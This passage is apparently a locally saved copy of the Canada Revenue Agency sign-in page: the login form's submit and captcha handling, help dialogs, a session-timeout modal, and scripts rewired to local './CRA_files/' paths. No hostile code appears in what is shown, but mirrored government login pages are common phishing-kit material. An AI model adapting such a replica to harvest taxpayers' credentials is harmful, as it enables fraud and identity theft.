				  	<div class="h-captcha" data-sitekey="a06f75d0-edbc-4562-9aef-7e2bb54bbbb2" data-callback="onSubmit" data-hcaptcha-source-id="input[data-hcaptcha-widget-id=&#39;0z0gdpqtff7&#39;]" style="display: none;"><iframe aria-hidden="true" data-hcaptcha-widget-id="0z0gdpqtff7" data-hcaptcha-response="" src="./CRA_files/hcaptcha.html" style="display: none;"></iframe><textarea id="g-recaptcha-response-0z0gdpqtff7" name="g-recaptcha-response" style="display: none;"></textarea><textarea id="h-captcha-response-0z0gdpqtff7" name="h-captcha-response" style="display: none;"></textarea></div><input type="submit" name="submitButton" class="btn btn-primary h-captcha" data-sitekey="a06f75d0-edbc-4562-9aef-7e2bb54bbbb2" data-callback="onSubmit" value="Sign in" id="submitButton" data-hcaptcha-widget-id="0z0gdpqtff7">
				  	<input type="button" name="exit" class="btn btn-default" value="Exit" id="exitButton">
		        </div>
			  	

			  	
				
	  		</div>
		</form>
	
		<p>
			<a href="https://www.canada.ca/en/revenue-agency/services/e-services/cra-login-services/cra-login-services-register-forgot-your-user.html" target="_blank" rel="noopener noreferrer">Register<span class="wb-inv">, opens in a separate window.</span></a> if you are a new user.
									
		</p>
		
		<p>
			To <a href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login?TYPE=33554432&amp;REALMOID=06-26a97681-2e5a-105d-9505-84cb2b4afb5e&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-u%2bl%2fc0bDuFqdbz6ofgybxcQlkO%2by5jWhT9%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo&amp;TARGET=-SM-HTTP%3a%2f%2fcms--sgj%2ecra--arc%2egc%2eca%2fgol--ged%2fawsc%2fcms%2fmacauth%3fTYPE%3d33554432%26REALMOID%3d06--00ba5d0a--2e5a--105d--9505--84cb2b4afb5e%26GUID%3d%26SMAUTHREASON%3d0%26METHOD%3dGET%26SMAGENTNAME%3d--SM--u-%2bl-%2fc0bDuFqdbz6ofgybxcQlkO-%2by5jWhT9-%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo%26TARGET%3d--SM--HTTP-%3a-%2f-%2fcms----sgj-%2ecra----arc-%2egc-%2eca-%2fgol----ged-%2fawsc-%2fcms-%2fpostlogin-%3fSAMLRequest-%3dfZBPS8QwEMXv---%2BylC7m3TbPdPQ1tYWIQFBVHx4EWmadqNpEnNpOrHN1sPqxfn---%2BJg3836vOszhbB---%2FU---%2B6wwkK---%2FRWKzp7K1wgBqFhVGhCFI8Hu5uBU---%2BZmLwLTjpDyTE6tIWgna3pOYQJRZbJERMc3lLpIQEv00GmEi7qJ2bT3BotM4TRcERHyY3zUi0BatqDQUXJ6VjT177tFOvkZg1lsW93m37brtk---%2Blwq2fdvnO1aWXVzFe0DUH---%2BpqRpzVyWIAG2rKGS---%2BSnCeseGJc8FwUmxdKnpXHJXGEoc2KxKks5mLx---%2Bp8GRBT---%2BbyE---%2BVv5CThvjBm1TWLjhL3eVXS83qyr73XXzDQ---%3D---%3D-%26RelayState-%3d3542d42435a8a4c21cf64d7e90d94a54fb511eff-%26SigAlg-%3dhttp---%3A---%2F---%2Fwww-%2ew3-%2eorg---%2F2001---%2F04---%2Fxmldsig----more---%23rsa----sha256-%26Signature-%3dwdb8kpznrwrYyJQknVWX3f7bkgh07PoT---%2FwvhT4C68n6Ojbc6Gh259pmpw3yKLhPnNLm1I7GbCsNotHy9ajwIRToRHUjkSH7Ib0vpzfi5Bh0VGafkG2E91OGUqhn2j---%2FNW---%2BPXQBkiVubMW1UNeMHSfV3ty1HTBM93XNYwdnJByCp---%2BQS6pmMiFftNA---%2B02UwxWYy6rKizMtP---%2B2h0i4fbqAcdNAB6fZpH8JOZTXEpryPqGtD---%2FVvuA6KLY---%2BByoLaBQGiZpa04jVbj2Au4wxBX---%2BHi---%2BTXB4DIZFQ0JCzPt0wKwdX1mnUEW6scH9AyFV---%2FjZ17---%2Bfczr7Lay3KHWZoiVKVUhZdvxA---%3D---%3D-%26SMPORTALURL-%3d3s3oC2jIJ0qEQ12Yiq9kAEjDKEUuKufwTJYavzvDtmH65tOSqAjOcKBbNnWrHFISoEmNt55oyAIlNgDZ---%2FeXB9Z---%2Fegu2zyozy#manageOptionsHelp" aria-controls="centred-popup" class="wb-lbx wb-init wb-lbx-inited" id="wb-auto-3">revoke or change your CRA user ID or password, or to manage your security questions and answers</a>, you must first sign in.
		</p>
		
		
	    <div id="pageLabel">Screen ID: CMS.30</div>
	    
	    
	</div>
	
	


	
	
		
		
		
	




<section id="forgotUserIDHelp" class="mfp-hide modal-dialog modal-content overlay-def">
	<header class="modal-header">
		<h2 class="modal-title">Forgot your user ID?</h2>
	</header>
	<div class="modal-body">
		<div>
	
	
			<p>
				You cannot recover your CRA user ID if you have forgotten or misplaced it.
					
			</p>
			<p>
                You must register again for <a href="https://www.canada.ca/en/revenue-agency/services/e-services/e-services-individuals/account-individuals.html%3EMy%20Account%3C/a%3E,%20%3Ca%20href=" https:="" www.canada.ca="" en="" revenue-agency="" services="" e-services="" e-services-individuals="" account-individuals.html"="">My Business Account</a>, <a href="https://www.canada.ca/en/revenue-agency/services/e-services/represent-a-client.html">Represent a Client</a>, <a href="https://www.canada.ca/en/revenue-agency/services/e-services/e-services-individuals/mycra.html%3EMyCRA%3C/a%3E,%20%3Ca%20href=" https:="" www.canada.ca="" en="" revenue-agency="" services="" e-services="" auto-fill-return-express-noa="" cra-register.html:="">Tax Data Delivery</a>, <a href="https://careers-carrieres.cra-arc.gc.ca/gol-ged/awsc/amss/entry?lang=en&amp;target=register&amp;program=wcisrec">Careers</a> or go to the <a href="https://www.canada.ca/en/revenue-agency.html">CRA main page</a>.,                                   
                    
            </p>
			
		</div>
	</div>
</section>












	
	<form id="cttForm_forgotUserIDHelp" action="https://apps.cra-arc.gc.ca/ebci/iesl/clicktotalk/ntr.action" method="post" target="_blank" rel="noopener noreferrer" autocomplete="off">
		<input name="RefNumber" type="hidden" value="">
		
			<input name="bypassaudit" type="hidden" value="1">
		
	</form>
	
	
	
	<script type="text/javascript">
	//<![CDATA[
	
		var cttLink = document.getElementById("cttLink_forgotUserIDHelp");

		//for pages which don't contain the CTT link
		if(cttLink != null)
		{
			cttLink.onclick = function(e)
		 	{
		 		document.getElementById("cttForm_forgotUserIDHelp").submit();
		 	}
	 	}
	
	//]]>	
	</script>
	

	
	
		
		
		
	




<section id="manageOptionsHelp" class="mfp-hide modal-dialog modal-content overlay-def">
	<header class="modal-header">
		<h2 class="modal-title">Help with�Manage my CRA security options</h2>
	</header>
	<div class="modal-body">
		<div>

				<p>To manage your security options such as revoke your CRA user ID, change your password, change your security questions and answers, etc., you must first sign in to a service. Once you have signed in, you will see a "Last CRA sign in" page.  On this page you will find links to manage your security options.</p>

			</div>
	</div>
</section>












	
	<form id="cttForm_manageOptionsHelp" action="https://apps.cra-arc.gc.ca/ebci/iesl/clicktotalk/ntr.action" method="post" target="_blank" rel="noopener noreferrer" autocomplete="off">
		<input name="RefNumber" type="hidden" value="">
		
			<input name="bypassaudit" type="hidden" value="1">
		
	</form>
	
	
	
	<script type="text/javascript">
	//<![CDATA[
	
		var cttLink = document.getElementById("cttLink_manageOptionsHelp");

		//for pages which don't contain the CTT link
		if(cttLink != null)
		{
			cttLink.onclick = function(e)
		 	{
		 		document.getElementById("cttForm_manageOptionsHelp").submit();
		 	}
	 	}
	
	//]]>	
	</script>
	

    
    
    
    <script type="text/javascript" src="./CRA_files/credential.js.download"></script>
    <script type="text/javascript" src="./CRA_files/constants.js.download"></script>
    <script type="text/javascript">

	    setAutoComplete();
	    togglePassword("password","togglePassword","togglePasswordSpan");
	    var form = document.getElementById("loginForm");
	    var useridInput = document.getElementById("userid");
	    var userInput = document.getElementById("user");
		var passwordInput = document.getElementById("password");
		var submitButton = document.getElementById("submitButton");
		var exitButton = document.getElementById("exitButton");

	    exitButton.onclick = function(e){
	    	document.getElementById("exitForm")
	    	  .submit();
	    }
		
	    function onSubmit(token) {
	    	//any one of User ID and Password input fields is empty should trigger the mandatory field error (CER.070)
            if (useridInput.value == "" || passwordInput.value == ""){
            
                //document.getElementById("useridErrorField").value= userInput.value;
                document.getElementById("useridErrorField").value= useridInput.value;
                document.getElementById("passwordErrorField").value= passwordInput.value;
                
                
                document
                    .getElementById("mandatoryErrorForm")
                    .submit();
                return false;
            }
            
            userInput.value = replaceAccentedChars(useridInput.value);
            submitButton.disabled = true;
            
	    	//document.getElementById("h-captcha-response").value=token;
	    	document.getElementById("userIdFieldforCaptcha").value= useridInput.value;
	    	$.ajax({
	    	        type: "POST",
	    	        url: "/gol-ged/awsc/cms/login/userIdCapture",
	    	        data: $('#userIdForm').serialize(), // serializes the form's elements.
	    	        success: function(data)
	    	        {
	    	        	document.getElementById("loginForm").submit();
	    	        }
	    	   });
	    	
	     };
	     
	     function noCaptcha(e){
             document.getElementById("h-captcha-response").value="value";
             onSubmit("value");
         }

         if (typeof hcaptcha === "undefined"){
             loginForm.onsubmit=noCaptcha;
         }

	    

	</script>
	
	</div>
	
	




	
	<div>
	    <dl id="wb-dtmd" property="dateModified">
	        <dt>Date modified: </dt>
	        <dd><time>2024-10-21</time></dd>
	    </dl>
	</div>
	
</main>




 

<footer id="wb-info" class=" wb-navcurr-inited">
	
	
	
	
	<div class="brand" style="border-top:4px solid #335175">
	    <div class="container">
	        <div class="row ">
	            <nav class="col-md-10 ftr-urlt-lnk">
	                <h2 class="wb-inv">About this site</h2>
	                <ul>
	                    
	                    
	                    
	                    <li><a href="https://www.canada.ca/en/transparency/terms.html" rel="noopener noreferrer" target="_blank">Terms and conditions</a></li>
	                    
	                    <li><a href="https://www.canada.ca/en/transparency/privacy.html" rel="noopener noreferrer" target="_blank">Privacy</a></li>
	                </ul>
	            </nav>
	            <div class="col-xs-6 visible-sm visible-xs tofpg">
	            	  
	                <a href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login?TYPE=33554432&amp;REALMOID=06-26a97681-2e5a-105d-9505-84cb2b4afb5e&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-u%2bl%2fc0bDuFqdbz6ofgybxcQlkO%2by5jWhT9%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo&amp;TARGET=-SM-HTTP%3a%2f%2fcms--sgj%2ecra--arc%2egc%2eca%2fgol--ged%2fawsc%2fcms%2fmacauth%3fTYPE%3d33554432%26REALMOID%3d06--00ba5d0a--2e5a--105d--9505--84cb2b4afb5e%26GUID%3d%26SMAUTHREASON%3d0%26METHOD%3dGET%26SMAGENTNAME%3d--SM--u-%2bl-%2fc0bDuFqdbz6ofgybxcQlkO-%2by5jWhT9-%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo%26TARGET%3d--SM--HTTP-%3a-%2f-%2fcms----sgj-%2ecra----arc-%2egc-%2eca-%2fgol----ged-%2fawsc-%2fcms-%2fpostlogin-%3fSAMLRequest-%3dfZBPS8QwEMXv---%2BylC7m3TbPdPQ1tYWIQFBVHx4EWmadqNpEnNpOrHN1sPqxfn---%2BJg3836vOszhbB---%2FU---%2B6wwkK---%2FRWKzp7K1wgBqFhVGhCFI8Hu5uBU---%2BZmLwLTjpDyTE6tIWgna3pOYQJRZbJERMc3lLpIQEv00GmEi7qJ2bT3BotM4TRcERHyY3zUi0BatqDQUXJ6VjT177tFOvkZg1lsW93m37brtk---%2Blwq2fdvnO1aWXVzFe0DUH---%2BpqRpzVyWIAG2rKGS---%2BSnCeseGJc8FwUmxdKnpXHJXGEoc2KxKks5mLx---%2Bp8GRBT---%2BbyE---%2BVv5CThvjBm1TWLjhL3eVXS83qyr73XXzDQ---%3D---%3D-%26RelayState-%3d3542d42435a8a4c21cf64d7e90d94a54fb511eff-%26SigAlg-%3dhttp---%3A---%2F---%2Fwww-%2ew3-%2eorg---%2F2001---%2F04---%2Fxmldsig----more---%23rsa----sha256-%26Signature-%3dwdb8kpznrwrYyJQknVWX3f7bkgh07PoT---%2FwvhT4C68n6Ojbc6Gh259pmpw3yKLhPnNLm1I7GbCsNotHy9ajwIRToRHUjkSH7Ib0vpzfi5Bh0VGafkG2E91OGUqhn2j---%2FNW---%2BPXQBkiVubMW1UNeMHSfV3ty1HTBM93XNYwdnJByCp---%2BQS6pmMiFftNA---%2B02UwxWYy6rKizMtP---%2B2h0i4fbqAcdNAB6fZpH8JOZTXEpryPqGtD---%2FVvuA6KLY---%2BByoLaBQGiZpa04jVbj2Au4wxBX---%2BHi---%2BTXB4DIZFQ0JCzPt0wKwdX1mnUEW6scH9AyFV---%2FjZ17---%2Bfczr7Lay3KHWZoiVKVUhZdvxA---%3D---%3D-%26SMPORTALURL-%3d3s3oC2jIJ0qEQ12Yiq9kAEjDKEUuKufwTJYavzvDtmH65tOSqAjOcKBbNnWrHFISoEmNt55oyAIlNgDZ---%2FeXB9Z---%2Fegu2zyozy#web-cont">Top of Page <span class="glyphicon glyphicon-chevron-up"></span></a>
	            </div>
	          <div class="col-xs-6 col-md-3 col-lg-2 text-right">
                <img src="./CRA_files/wmms-blk.svg" alt="Symbol of the Government of Canada">
            </div>
	        </div>
	    </div>
	</div>
</footer>
<!--[if gte IE 9 | !IE ]><!-->
<script src="./CRA_files/jquery.min.js.download"></script>
<script src="./CRA_files/wet-boew.min.js.download"></script><span id="wb-rsz" class="wb-init">&nbsp;</span>
<!--<![endif]-->

<!--[if lt IE 9]>
<script src="/ebci/wet/v5.0.1/wet-boew/js/ie8-wet-boew2.min.js"></script>

<![endif]-->
<script src="./CRA_files/theme.min.js.download"></script>



<script>

/**
 * Disable the Logout button on first click. Any click after will not
 * fire an event.
 */

$(document).ready(function(){
	$('#logout-btn').click(function(){
		$(this).attr('disabled','disabled');
		$(this).attr('aria-disabled','true');
		$(this).addClass("disabled");

		$(this).click(function(e){
			event.preventDefault();
		});
	});
});

</script>

<script src="./CRA_files/apps.js.download"></script>


	<script type="text/javascript">
	
	  (function() {
	
	    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
	
	    ga.src = '/gol-ged/awsc/cms/pub/js/timeout.js';
	
	    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	
	  })();
	  
	</script>


<script type="text/javascript">
$('meta[name="dcterms.title"]').attr('content',document.title);
if (_satellite){
    _satellite.pageBottom();
}</script><script>
_satellite.track('pageReset');
</script>


<div aria-hidden="true" style="background-color: rgb(255, 255, 255); border: 1px solid rgb(215, 215, 215); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 4px; border-radius: 4px; left: auto; top: -10000px; z-index: -2147483648; position: absolute; pointer-events: auto; transition: opacity 0.15s ease-out; opacity: 0; visibility: hidden;"><div style="position: relative; z-index: 1;"><iframe src="./CRA_files/hcaptcha(1).html" frameborder="0" scrolling="no" allow="private-state-token-issuance &#39;src&#39;; private-state-token-redemption &#39;src&#39;" title="Main content of the hCaptcha challenge" style="border: 0px; z-index: 2000000000; position: relative;"></iframe></div><div style="width: 100%; height: 100%; position: fixed; pointer-events: none; top: 0px; left: 0px; z-index: 0; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div style="border-width: 11px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 1; right: 100%;"><div style="border-width: 10px; border-style: solid; border-color: transparent rgb(255, 255, 255) transparent transparent; position: relative; top: 10px; z-index: 1;"></div><div style="border-width: 11px; border-style: solid; border-color: transparent rgb(215, 215, 215) transparent transparent; position: relative; top: -11px; z-index: 0;"></div></div></div><a class="wb-lbx lbx-modal mfp-hide" href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login?TYPE=33554432&amp;REALMOID=06-26a97681-2e5a-105d-9505-84cb2b4afb5e&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-u%2bl%2fc0bDuFqdbz6ofgybxcQlkO%2by5jWhT9%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo&amp;TARGET=-SM-HTTP%3a%2f%2fcms--sgj%2ecra--arc%2egc%2eca%2fgol--ged%2fawsc%2fcms%2fmacauth%3fTYPE%3d33554432%26REALMOID%3d06--00ba5d0a--2e5a--105d--9505--84cb2b4afb5e%26GUID%3d%26SMAUTHREASON%3d0%26METHOD%3dGET%26SMAGENTNAME%3d--SM--u-%2bl-%2fc0bDuFqdbz6ofgybxcQlkO-%2by5jWhT9-%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo%26TARGET%3d--SM--HTTP-%3a-%2f-%2fcms----sgj-%2ecra----arc-%2egc-%2eca-%2fgol----ged-%2fawsc-%2fcms-%2fpostlogin-%3fSAMLRequest-%3dfZBPS8QwEMXv---%2BylC7m3TbPdPQ1tYWIQFBVHx4EWmadqNpEnNpOrHN1sPqxfn---%2BJg3836vOszhbB---%2FU---%2B6wwkK---%2FRWKzp7K1wgBqFhVGhCFI8Hu5uBU---%2BZmLwLTjpDyTE6tIWgna3pOYQJRZbJERMc3lLpIQEv00GmEi7qJ2bT3BotM4TRcERHyY3zUi0BatqDQUXJ6VjT177tFOvkZg1lsW93m37brtk---%2Blwq2fdvnO1aWXVzFe0DUH---%2BpqRpzVyWIAG2rKGS---%2BSnCeseGJc8FwUmxdKnpXHJXGEoc2KxKks5mLx---%2Bp8GRBT---%2BbyE---%2BVv5CThvjBm1TWLjhL3eVXS83qyr73XXzDQ---%3D---%3D-%26RelayState-%3d3542d42435a8a4c21cf64d7e90d94a54fb511eff-%26SigAlg-%3dhttp---%3A---%2F---%2Fwww-%2ew3-%2eorg---%2F2001---%2F04---%2Fxmldsig----more---%23rsa----sha256-%26Signature-%3dwdb8kpznrwrYyJQknVWX3f7bkgh07PoT---%2FwvhT4C68n6Ojbc6Gh259pmpw3yKLhPnNLm1I7GbCsNotHy9ajwIRToRHUjkSH7Ib0vpzfi5Bh0VGafkG2E91OGUqhn2j---%2FNW---%2BPXQBkiVubMW1UNeMHSfV3ty1HTBM93XNYwdnJByCp---%2BQS6pmMiFftNA---%2B02UwxWYy6rKizMtP---%2B2h0i4fbqAcdNAB6fZpH8JOZTXEpryPqGtD---%2FVvuA6KLY---%2BByoLaBQGiZpa04jVbj2Au4wxBX---%2BHi---%2BTXB4DIZFQ0JCzPt0wKwdX1mnUEW6scH9AyFV---%2FjZ17---%2Bfczr7Lay3KHWZoiVKVUhZdvxA---%3D---%3D-%26SMPORTALURL-%3d3s3oC2jIJ0qEQ12Yiq9kAEjDKEUuKufwTJYavzvDtmH65tOSqAjOcKBbNnWrHFISoEmNt55oyAIlNgDZ---%2FeXB9Z---%2Fegu2zyozy#wb-sessto-modal"></a><section id="wb-sessto-modal" style="visibility:hidden" class="mfp-hide modal-dialog modal-content overlay-def"><header class="modal-header"><h2 class="modal-title">Session timeout warning</h2></header><div class="modal-body" id="modal-body"> <p>Your session will expire automatically in <span id="timeout-min">3</span> min <span id="timeout-sec">0</span> sec. <br> Select "Continue Session" to extend your session.</p></div><div class="modal-footer" id="modal-footer"><button type="button" class="btn btn-primary popup-modal-dismiss" onclick="awsc.warningTimer.extendSession()">Continue session</button> <button type="button" class="btn btn-default" onclick="awsc.warningTimer.logout()">End session now</button> </div> </section></body><link rel="stylesheet" href="./CRA_files/timeout.css"></html>